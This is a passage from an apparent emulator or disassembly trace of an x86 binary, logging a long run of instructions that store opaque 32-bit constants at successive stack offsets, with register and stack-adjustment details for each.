0x10000 saving data to stack: 2429897077 4 0x403580: mov dword ptr [esp + 0xd10], 0xaafc13a9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d10 for stack size 0x10000 saving data to stack: 2868646825 4 0x40358b: mov dword ptr [esp + 0xd14], 0x260eadfe, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d14 for stack size 0x10000 saving data to stack: 638496254 4 0x403596: mov dword ptr [esp + 0xd18], 0xe7eb3606, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d18 for stack size 0x10000 saving data to stack: 3890951686 4 0x4035a1: mov dword ptr [esp + 0xd1c], 0x5dc2a5db, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d1c for stack size 0x10000 saving data to stack: 1573037531 4 0x4035ac: mov dword ptr [esp + 0xd20], 0x5fbe9afb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d20 for stack size 0x10000 saving data to stack: 1606327035 4 0x4035b7: mov dword ptr [esp + 0xd24], 0xed05e004, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d24 for stack size 0x10000 saving data to stack: 3976585220 4 0x4035c2: mov dword ptr [esp + 0xd28], 0x7f63af28, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d28 for stack size 0x10000 saving data to stack: 2137239336 4 0x4035cd: mov dword ptr [esp + 0xd2c], 0xab663ac1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d2c for stack size 0x10000 saving data to stack: 2875603649 4 0x4035d8: mov dword ptr [esp + 0xd30], 0x75e6017d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d30 for stack size 0x10000 saving data to stack: 1978007933 4 0x4035e3: mov dword ptr [esp + 0xd34], 0x160d18ba, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d34 for stack size 0x10000 saving data to stack: 369957050 4 0x4035ee: mov dword ptr [esp + 0xd38], 0x646aa12a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d38 for stack size 0x10000 saving data to stack: 1684709674 4 0x4035f9: mov dword ptr [esp + 0xd3c], 0x294776f7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d3c for stack size 0x10000 saving data to stack: 692549367 4 0x403604: mov dword ptr [esp + 0xd40], 0x3112bd3f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d40 for stack size 0x10000 saving data to stack: 823311679 4 0x40360f: mov dword ptr [esp + 0xd44], 0x6a0a74c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d44 for stack size 0x10000 saving data to stack: 1779070144 4 0x40361a: mov dword ptr [esp + 0xd48], 0xb97e865c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d48 for stack size 0x10000 saving data to stack: 3112076892 4 0x403625: mov dword ptr [esp + 0xd4c], 0x156cbecd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d4c for stack size 0x10000 saving data to stack: 359448269 4 0x403630: mov dword ptr [esp + 0xd50], 0xe40c7ab1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d50 for stack size 0x10000 saving data to stack: 3826023089 4 0x40363b: mov dword ptr [esp + 0xd54], 0xd0e18376, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d54 for stack size 0x10000 saving data to stack: 3504440182 4 0x403646: mov dword ptr [esp + 0xd58], 0xfe35116e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d58 for stack size 0x10000 saving data to stack: 4264890734 4 0x403651: mov dword ptr [esp + 0xd5c], 0x6b47773, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d5c for stack size 0x10000 saving data to stack: 112490355 4 0x40365c: mov dword ptr [esp + 0xd60], 0xfe390be3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d60 for stack size 0x10000 saving data to stack: 4265151459 4 0x403667: mov dword ptr [esp + 0xd64], 0x84bb27fc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d64 for stack size 0x10000 saving data to stack: 2226857980 4 0x403672: mov dword ptr [esp + 0xd68], 0x8dc153f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d68 for stack size 0x10000 saving data to stack: 2378257392 4 0x40367d: mov dword ptr [esp + 0xd6c], 0x12738039, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d6c for stack size 0x10000 saving data to stack: 309559353 4 0x403688: mov dword ptr [esp + 0xd70], 0x51b2d0c5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d70 for stack size 0x10000 saving data to stack: 1370673349 4 0x403693: mov dword ptr [esp + 0xd74], 0x27aab812, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d74 for stack size 0x10000 saving data to stack: 665499666 4 0x40369e: mov dword ptr [esp + 0xd78], 0xea803ab2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d78 for stack size 0x10000 saving data to stack: 3934272178 4 0x4036a9: mov dword ptr [esp + 0xd7c], 0x5a7e3b0f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d7c for stack size 0x10000 saving data to stack: 1518222095 4 0x4036b4: mov dword ptr [esp + 0xd80], 0xbf41df67, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d80 for stack size 0x10000 saving data to stack: 3208765287 4 0x4036bf: mov dword ptr [esp + 0xd84], 0xe52d00f8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d84 for stack size 0x10000 saving data to stack: 3844931832 4 0x4036ca: mov dword ptr [esp + 0xd88], 0x6996804, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d88 for stack size 0x10000 saving data to stack: 110716932 4 0x4036d5: mov dword ptr [esp + 0xd8c], 0x4446a3a5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d8c for stack size 0x10000 saving data to stack: 1145480101 4 0x4036e0: mov dword ptr [esp + 0xd90], 0xb3b009b9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d90 for stack size 0x10000 saving data to stack: 3014658489 4 0x4036eb: mov dword ptr [esp + 0xd94], 0xd980082e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d94 for stack size 0x10000 saving data to stack: 3649046574 4 0x4036f6: mov dword ptr [esp + 0xd98], 0x2802b016, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d98 for stack size 0x10000 saving data to stack: 671264790 4 0x403701: mov dword ptr [esp + 0xd9c], 0xb46fbe8b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d9c for stack size 0x10000 saving data to stack: 3027222155 4 0x40370c: mov dword ptr [esp + 0xda0], 0x44c2cd8b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8da0 for stack size 0x10000 saving data to stack: 1153617291 4 0x403717: mov dword ptr [esp + 0xda4], 0x43b2f8b4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8da4 for stack size 0x10000 saving data to stack: 1135802548 4 0x403722: mov dword ptr [esp + 0xda8], 0x7112dc38, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8da8 for stack size 0x10000 saving data to stack: 1897061432 4 0x40372d: mov dword ptr [esp + 0xdac], 0x47636d71, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dac for stack size 0x10000 saving data to stack: 1197698417 4 0x403738: mov dword ptr [esp + 0xdb0], 0xf349ba0d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8db0 for stack size 0x10000 saving data to stack: 4081695245 4 0x403743: mov dword ptr [esp + 0xdb4], 0x7190cd6a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8db4 for stack size 0x10000 saving data to stack: 1905315178 4 0x40374e: mov dword ptr [esp + 0xdb8], 0x981e5eba, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8db8 for stack size 0x10000 saving data to stack: 2552127162 4 0x403759: mov dword ptr [esp + 0xdbc], 0x75875da7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dbc for stack size 0x10000 saving data to stack: 1971805607 4 0x403764: mov dword ptr [esp + 0xdc0], 0xc7c3d4f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dc0 for stack size 0x10000 saving data to stack: 209468751 4 0x40376f: mov dword ptr [esp + 0xdc4], 0x5f81a270, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dc4 for stack size 0x10000 saving data to stack: 1602331248 4 0x40377a: mov dword ptr [esp + 0xdc8], 0x9a7e436c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dc8 for stack size 0x10000 saving data to stack: 2591966060 4 0x403785: mov dword ptr [esp + 0xdcc], 0x36e7927d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dcc for stack size 0x10000 saving data to stack: 921145981 4 0x403790: mov dword ptr [esp + 0xdd0], 0x422cf1c1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dd0 for stack size 0x10000 saving data to stack: 1110241729 4 0x40379b: mov dword ptr [esp + 0xdd4], 0xaf17f0a6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dd4 for stack size 0x10000 saving data to stack: 2937581734 4 0x4037a6: mov dword ptr [esp + 0xdd8], 0x44fd5e7e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dd8 for stack size 0x10000 saving data to stack: 1157455486 4 0x4037b1: mov dword ptr [esp + 0xddc], 0x66ec3d23, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ddc for stack size 0x10000 saving data to stack: 1726758179 4 0x4037bc: mov dword ptr [esp + 0xde0], 0xbbf663f3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8de0 for stack size 0x10000 saving data to stack: 3153486835 4 0x4037c7: mov dword ptr [esp + 0xde4], 0xfa64f12c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8de4 for stack size 0x10000 saving data to stack: 4200919340 4 0x4037d2: mov dword ptr [esp + 0xde8], 0xd9d38c80, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8de8 for stack size 0x10000 saving data to stack: 3654519936 4 0x4037dd: mov dword ptr [esp + 0xdec], 0xf23642e9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dec for stack size 0x10000 saving data to stack: 4063642345 4 0x4037e8: mov dword ptr [esp + 0xdf0], 0x2e4ca4d5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8df0 for stack size 0x10000 saving data to stack: 776774869 4 0x4037f3: mov dword ptr [esp + 0xdf4], 0x62a566c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8df4 for stack size 0x10000 saving data to stack: 1655006914 4 0x4037fe: mov dword ptr [esp + 0xdf8], 0xa7c3b642, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8df8 for stack size 0x10000 saving data to stack: 2814621250 4 0x403809: mov dword ptr [esp + 0xdfc], 0x108eda3f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8dfc for stack size 0x10000 saving data to stack: 277797439 4 0x403814: mov dword ptr [esp + 0xe00], 0x6e30d677, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e00 for stack size 0x10000 saving data to stack: 1848694391 4 0x40381f: mov dword ptr [esp + 0xe04], 0xf3f40a28, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e04 for stack size 0x10000 saving data to stack: 4092856872 4 0x40382a: mov dword ptr [esp + 0xe08], 0x6f141214, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e08 for stack size 0x10000 saving data to stack: 1863586324 4 0x403835: mov dword ptr [esp + 0xe0c], 0x11559bd5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e0c for stack size 0x10000 saving data to stack: 290823125 4 0x403840: mov dword ptr [esp + 0xe10], 0xa9b30ec9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e10 for stack size 0x10000 saving data to stack: 2847084233 4 0x40384b: mov dword ptr [esp + 0xe14], 0x438a585e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e14 for stack size 0x10000 saving data to stack: 1133140062 4 0x403856: mov dword ptr [esp + 0xe18], 0x5aa26e26, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e18 for stack size 0x10000 saving data to stack: 1520594470 4 0x403861: mov dword ptr [esp + 0xe1c], 0x23f6e43b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e1c for stack size 0x10000 saving data to stack: 603382843 4 0x40386c: mov dword ptr [esp + 0xe20], 0x5b95c11b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e20 for stack size 0x10000 saving data to stack: 1536540955 4 0x403877: mov dword ptr [esp + 0xe24], 0x317b2d64, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e24 for stack size 0x10000 saving data to stack: 830156132 4 0x403882: mov dword ptr [esp + 0xe28], 0xc2b41348, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e28 for stack size 0x10000 saving data to stack: 3266581320 4 0x40388d: mov dword ptr [esp + 0xe2c], 0xe820fd21, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e2c for stack size 0x10000 saving data to stack: 3894476065 4 0x403898: mov dword ptr [esp + 0xe30], 0x8107039d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e30 for stack size 0x10000 saving data to stack: 2164720541 4 0x4038a3: mov dword ptr [esp + 0xe34], 0x5f59021a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e34 for stack size 0x10000 saving data to stack: 1599668762 4 0x4038ae: mov dword ptr [esp + 0xe38], 0x139afaca, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e38 for stack size 0x10000 saving data to stack: 328923850 4 0x4038b9: mov dword ptr [esp + 0xe3c], 0xb980abd7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e3c for stack size 0x10000 saving data to stack: 3112217559 4 0x4038c4: mov dword ptr [esp + 0xe40], 0x1f47fedf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e40 for stack size 0x10000 saving data to stack: 524811999 4 0x4038cf: mov dword ptr [esp + 0xe44], 0xc98bf2a0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e44 for stack size 0x10000 saving data to stack: 3381392032 4 0x4038da: mov dword ptr [esp + 0xe48], 0xc6a4837c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e48 for stack size 0x10000 saving data to stack: 3332670332 4 0x4038e5: mov dword ptr [esp + 0xe4c], 0xd5a2fe2d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e4c for stack size 0x10000 saving data to stack: 3584228909 4 0x4038f0: mov dword ptr [esp + 0xe50], 0x78a53d51, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e50 for stack size 0x10000 saving data to stack: 2024095057 4 0x4038fb: mov dword ptr [esp + 0xe54], 0xbddef9d6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e54 for stack size 0x10000 saving data to stack: 3185506774 4 0x403906: mov dword ptr [esp + 0xe58], 0xd906220e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e58 for stack size 0x10000 saving data to stack: 3641057806 4 0x403911: mov dword ptr [esp + 0xe5c], 0x326edfd3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e5c for stack size 0x10000 saving data to stack: 846127059 4 0x40391c: mov dword ptr [esp + 0xe60], 0x3f7be983, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e60 for stack size 0x10000 saving data to stack: 1065085315 4 0x403927: mov dword ptr [esp + 0xe64], 0x96f5b55c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e64 for stack size 0x10000 saving data to stack: 2532685148 4 0x403932: mov dword ptr [esp + 0xe68], 0xf14f2790, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e68 for stack size 0x10000 saving data to stack: 4048496528 4 0x40393d: mov dword ptr [esp + 0xe6c], 0xfd4c19, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e6c for stack size 0x10000 saving data to stack: 16600089 4 0x403948: mov dword ptr [esp + 0xe70], 0xa4cb2365, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e70 for stack size 0x10000 saving data to stack: 2764776293 4 0x403953: mov dword ptr [esp + 0xe74], 0xf9627af2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e74 for stack size 0x10000 saving data to stack: 4183980786 4 0x40395e: mov dword ptr [esp + 0xe78], 0xfb130d52, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e78 for stack size 0x10000 saving data to stack: 4212329810 4 0x403969: mov dword ptr [esp + 0xe7c], 0xd0915b6f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e7c for stack size 0x10000 saving data to stack: 3499187055 4 0x403974: mov dword ptr [esp + 0xe80], 0x16557887, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e80 for stack size 0x10000 saving data to stack: 374700167 4 0x40397f: mov dword ptr [esp + 0xe84], 0xd22a7758, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e84 for stack size 0x10000 saving data to stack: 3525998424 4 0x40398a: mov dword ptr [esp + 0xe88], 0x37c20a24, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e88 for stack size 0x10000 saving data to stack: 935463460 4 0x403995: mov dword ptr [esp + 0xe8c], 0xc2c4d205, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e8c for stack size 0x10000 saving data to stack: 3267678725 4 0x4039a0: mov dword ptr [esp + 0xe90], 0xc58364d9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e90 for stack size 0x10000 saving data to stack: 3313722585 4 0x4039ab: mov dword ptr [esp + 0xe94], 0x3901860e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e94 for stack size 0x10000 saving data to stack: 956401166 4 0x4039b6: mov dword ptr [esp + 0xe98], 0x7689aab6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e98 for stack size 0x10000 saving data to stack: 1988733622 4 0x4039c1: mov dword ptr [esp + 0xe9c], 0x22d516b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8e9c for stack size 0x10000 saving data to stack: 36524395 4 0x4039cc: mov dword ptr [esp + 0xea0], 0xa838de2b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ea0 for stack size 0x10000 saving data to stack: 2822299179 4 0x4039d7: mov dword ptr [esp + 0xea4], 0x8cfee214, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ea4 for stack size 0x10000 saving data to stack: 2365514260 4 0x4039e2: mov dword ptr [esp + 0xea8], 0x32c429d8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ea8 for stack size 0x10000 saving data to stack: 851716568 4 0x4039ed: mov dword ptr [esp + 0xeac], 0xdd55c351, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8eac for stack size 0x10000 saving data to stack: 3713385297 4 0x4039f8: mov dword ptr [esp + 0xeb0], 0x7ee5432d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8eb0 for stack size 0x10000 saving data to stack: 2128954157 4 0x403a03: mov dword ptr [esp + 0xeb4], 0xb6061aca, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8eb4 for stack size 0x10000 saving data to stack: 3053853386 4 0x403a0e: mov dword ptr [esp + 0xeb8], 0x17d1c6da, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8eb8 for stack size 0x10000 saving data to stack: 399623898 4 0x403a19: mov dword ptr [esp + 0xebc], 0xcdf48a07, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ebc for stack size 0x10000 saving data to stack: 3455355399 4 0x403a24: mov dword ptr [esp + 0xec0], 0xfcd5866f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ec0 for stack size 0x10000 saving data to stack: 4241852015 4 0x403a2f: mov dword ptr [esp + 0xec4], 0x7cfd4cd0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ec4 for stack size 0x10000 saving data to stack: 2096975056 4 0x403a3a: mov dword ptr [esp + 0xec8], 0xe0352d0c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ec8 for stack size 0x10000 saving data to stack: 3761581324 4 0x403a45: mov dword ptr [esp + 0xecc], 0x2c5016dd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ecc for stack size 0x10000 saving data to stack: 743446237 4 0x403a50: mov dword ptr [esp + 0xed0], 0xde545be1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ed0 for stack size 0x10000 saving data to stack: 3730070497 4 0x403a5b: mov dword ptr [esp + 0xed4], 0xd252d806, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ed4 for stack size 0x10000 saving data to stack: 3528644614 4 0x403a66: mov dword ptr [esp + 0xed8], 0x98c48a1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ed8 for stack size 0x10000 saving data to stack: 2563017246 4 0x403a71: mov dword ptr [esp + 0xedc], 0x3d581103, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8edc for stack size 0x10000 saving data to stack: 1029181699 4 0x403a7c: mov dword ptr [esp + 0xee0], 0xfa81d293, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ee0 for stack size 0x10000 saving data to stack: 4202812051 4 0x403a87: mov dword ptr [esp + 0xee4], 0x4066940c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ee4 for stack size 0x10000 saving data to stack: 1080464396 4 0x403a92: mov dword ptr [esp + 0xee8], 0x5bd2eb20, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ee8 for stack size 0x10000 saving data to stack: 1540549408 4 0x403a9d: mov dword ptr [esp + 0xeec], 0x76a71549, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8eec for stack size 0x10000 saving data to stack: 1990661449 4 0x403aa8: mov dword ptr [esp + 0xef0], 0xb7437375, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ef0 for stack size 0x10000 saving data to stack: 3074650997 4 0x403ab3: mov dword ptr [esp + 0xef4], 0xa8a709a2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ef4 for stack size 0x10000 saving data to stack: 2829519266 4 0x403abe: mov dword ptr [esp + 0xef8], 0x3a9ed9e2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ef8 for stack size 0x10000 saving data to stack: 983488994 4 0x403ac9: mov dword ptr [esp + 0xefc], 0xdb7a8c9f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8efc for stack size 0x10000 saving data to stack: 3682241695 4 0x403ad4: mov dword ptr [esp + 0xf00], 0x67267717, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f00 for stack size 0x10000 saving data to stack: 1730574103 4 0x403adf: mov dword ptr [esp + 0xf04], 0xc75f3d88, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f04 for stack size 0x10000 saving data to stack: 3344907656 4 0x403aea: mov dword ptr [esp + 0xf08], 0x339ef634, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f08 for stack size 0x10000 saving data to stack: 866055732 4 0x403af5: mov dword ptr [esp + 0xf0c], 0x877b6435, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f0c for stack size 0x10000 saving data to stack: 2273010741 4 0x403b00: mov dword ptr [esp + 0xf10], 0x69cb41e9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f10 for stack size 0x10000 saving data to stack: 1774928361 4 0x403b0b: mov dword ptr [esp + 0xf14], 0x1cb4c8be, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f14 for stack size 0x10000 saving data to stack: 481609918 4 0x403b16: mov dword ptr [esp + 0xf18], 0xa6ba6446, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f18 for stack size 0x10000 saving data to stack: 2797233222 4 0x403b21: mov dword ptr [esp + 0xf1c], 0x5468c09b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f1c for stack size 0x10000 saving data to stack: 1416151195 4 0x403b2c: mov dword ptr [esp + 0xf20], 0x1e8dc93b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f20 for stack size 0x10000 saving data to stack: 512608571 4 0x403b37: mov dword ptr [esp + 0xf24], 0xe3abfac4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f24 for stack size 0x10000 saving data to stack: 3819698884 4 0x403b42: mov dword ptr [esp + 0xf28], 0x3e32dd68, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f28 for stack size 0x10000 saving data to stack: 1043520872 4 0x403b4d: mov dword ptr [esp + 0xf2c], 0xa20c5581, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f2c for stack size 0x10000 saving data to stack: 2718717313 4 0x403b58: mov dword ptr [esp + 0xf30], 0x34b52fbd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f30 for stack size 0x10000 saving data to stack: 884289469 4 0x403b63: mov dword ptr [esp + 0xf34], 0xcb3337a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f34 for stack size 0x10000 saving data to stack: 213070714 4 0x403b6e: mov dword ptr [esp + 0xf38], 0x2339cf6a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f38 for stack size 0x10000 saving data to stack: 590991210 4 0x403b79: mov dword ptr [esp + 0xf3c], 0x1fed91b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f3c for stack size 0x10000 saving data to stack: 535663031 4 0x403b84: mov dword ptr [esp + 0xf40], 0xefe1eb7f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f40 for stack size 0x10000 saving data to stack: 4024560511 4 0x403b8f: mov dword ptr [esp + 0xf44], 0x60b08f80, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f44 for stack size 0x10000 saving data to stack: 1622183808 4 0x403b9a: mov dword ptr [esp + 0xf48], 0x784db49c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f48 for stack size 0x10000 saving data to stack: 2018358428 4 0x403ba5: mov dword ptr [esp + 0xf4c], 0xc12d98d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f4c for stack size 0x10000 saving data to stack: 202561933 4 0x403bb0: mov dword ptr [esp + 0xf50], 0xa2dba8f1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f50 for stack size 0x10000 saving data to stack: 2732304625 4 0x403bbb: mov dword ptr [esp + 0xf54], 0xc7879e36, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f54 for stack size 0x10000 saving data to stack: 3347553846 4 0x403bc6: mov dword ptr [esp + 0xf58], 0xbd043fae, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f58 for stack size 0x10000 saving data to stack: 3171172270 4 0x403bd1: mov dword ptr [esp + 0xf5c], 0xfd5a9233, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f5c for stack size 0x10000 saving data to stack: 4250571315 4 0x403bdc: mov dword ptr [esp + 0xf60], 0xbd083a23, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f60 for stack size 0x10000 saving data to stack: 3171432995 4 0x403be7: mov dword ptr [esp + 0xf64], 0x7b6142bc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f64 for stack size 0x10000 saving data to stack: 2069971644 4 0x403bf2: mov dword ptr [esp + 0xf68], 0x4c908230, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f68 for stack size 0x10000 saving data to stack: 1284538928 4 0x403bfd: mov dword ptr [esp + 0xf6c], 0x9199af9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f6c for stack size 0x10000 saving data to stack: 152673017 4 0x403c08: mov dword ptr [esp + 0xf70], 0x1081ff05, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f70 for stack size 0x10000 saving data to stack: 276954885 4 0x403c13: mov dword ptr [esp + 0xf74], 0x1e50d2d2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f74 for stack size 0x10000 saving data to stack: 508613330 4 0x403c1e: mov dword ptr [esp + 0xf78], 0xa94f68f2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f78 for stack 